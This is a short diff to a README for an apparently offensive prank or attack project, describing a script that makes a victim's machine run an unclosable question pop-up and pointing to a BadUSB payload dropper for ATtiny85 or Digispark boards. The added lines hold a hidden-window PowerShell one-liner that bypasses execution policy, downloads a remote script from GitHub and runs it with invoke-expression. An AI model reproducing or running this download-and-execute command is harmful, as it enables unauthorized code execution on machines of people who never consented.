@@ -5,6 +5,9 @@
 #### Description
 A script to run a .exe file which asks multiple questions to victim without being able to be closed.
 
+```
+powershell -w h -NoP -NonI -Exec Bypass $pl = iwr https://raw.githubusercontent.com/d0cax/pop-ups/main/PopUps.ps1?dl=1; invoke-expression $pl
+```
 #### Usage 
 Check out my payload dropper to use on an attiny85 or digispark.
 * [Payload dropper](https://github.com/d0cax/payloaddropper)
